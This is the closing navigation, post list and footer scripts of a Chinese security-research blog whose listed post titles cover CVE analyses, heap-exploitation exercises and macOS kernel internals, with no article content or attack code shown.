class="toc-number">8.</span> <span class="toc-text">0x07 参考&感谢</span></a></li></ol>
</div>
<style>
    .left-col .switch-btn {
        display: none;
    }
    .left-col .switch-area {
        display: none;
    }
</style>

<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }

    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
            $(".switch-btn, .switch-area").fadeOut(300);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
            $(".switch-btn, .switch-area").fadeIn(500);
        }
    })

    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
        $(".switch-btn, .switch-area").show();
    }
</script>







    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2016/02/19/CVE-2015-7547分析与调试/" title="上一篇: 对CVE-2015-7547简单的分析与调试">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2016/01/27/frame-faking/" title="下一篇: frame-faking-介绍-函数调用伪造">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/CVE-2016-4622调试笔记PART2/">CVE-2016-4622调试笔记(PART II)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/CVE-2016-4622调试笔记/">CVE-2016-4622调试笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/try-out-PassiveFuzzFrameworkOSX/">PassiveFuzz框架试用与调试小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/CVE-2016-4669分析与调试/">CVE-2016-4669分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/task-t-considered-harmfull-analysis-P1/">XNU内核中task_t相关漏洞分析笔记(Part I)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/07/CVE-2016-4656分析与调试/">CVE-2016-4656分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/再看CVE-2016-1757浅析mach message的使用/">再看CVE-2016-1757---浅析mach message的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/libmalloc源码分析之nanozone-s的处理/">libmalloc源码分析之nanozone_s的处理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/28/libmalloc源码分析之初始化/">libmalloc源码分析之初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/24/nlist-Mach-O文件重定向信息数据结构分析/">nlist-Mach-O文件重定向信息数据结构分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/23/10-11-4版本小结/">10-11-4版本小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/29/CVE-2016-1749内核代码执行POC分析/">CVE-2016-1749内核代码执行POC分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/19/CVE-2016-1757利用程序分析/">CVE-2016-1757利用程序分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/18/apple沙盒研究之基础知识/">apple沙盒研究之基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/13/利用patch绕过kextload对内核签名的检测/">利用patch绕过kextload对内核签名的检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/03/CVE-2016-1757简单分析/">CVE-2016-1757简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/OSX内核加载mach-o流程分析/">OSX内核加载mach-o流程分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/fishhook源码分析/">fishhook源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/dyld源码分析load/">dyld源码分析-动态加载load</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/10/Mach-O的动态链接/">Mach-O的动态链接相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/mach-o文件格式分析/">mach-o格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/03/CVE-2016-0799简单分析/">CVE-2016-0799简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/dyld中macho加载的简单分析/">dyld中mach-o文件加载的简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/OS-X-内核研究-基础知识/">OS X 内核研究 准备知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/">通过fusion level02浅谈exploit中的函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试副本/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/09/CVE-2016-1879调试&分析/">CVE-2016-1879 调试&分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/01/27/frame-faking/">frame-faking-介绍-函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/12/图解DWORDSHOOT/">图解DWORDSHOOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap2/">protostar详细解析 heap2 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap1/">protostar详细解析 heap1 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/04/栈溢出练习小结/">wargame简单入门</a></li></ul>
    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#toc, .switch-btn, .switch-area").toggle();
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
                $(".switch-btn, .switch-area").fadeToggle(300);
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2016 mrh
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >本站到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 21;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-71141416-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>

  </div>
</body>
</html>